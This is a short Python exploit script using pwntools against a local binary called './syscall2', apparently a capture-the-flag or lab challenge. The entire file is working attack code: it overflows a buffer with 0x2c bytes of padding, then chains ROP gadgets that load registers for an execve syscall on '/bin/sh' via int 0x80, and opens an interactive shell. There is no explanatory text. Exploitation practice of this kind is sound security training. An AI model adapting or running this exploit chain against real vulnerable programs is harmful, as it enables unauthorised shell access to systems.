from pwn import *

sh = process('./syscall2')
pop_ecx_add_ret = 0x08050abf
pop_edx_mov_ebx_esi_ret = 0x080531f8
pop_eax_ret = 0x080bb196

binsh = 0x080b1014
int_0x80 = 0x08049ab2
payload = flat(['a'* 0x2c, pop_ecx_add_ret, 0, pop_edx_mov_ebx_esi_ret, 0, binsh, pop_eax_ret, 0xb, int_0x80])


sh.sendline(payload)
sh.interactive()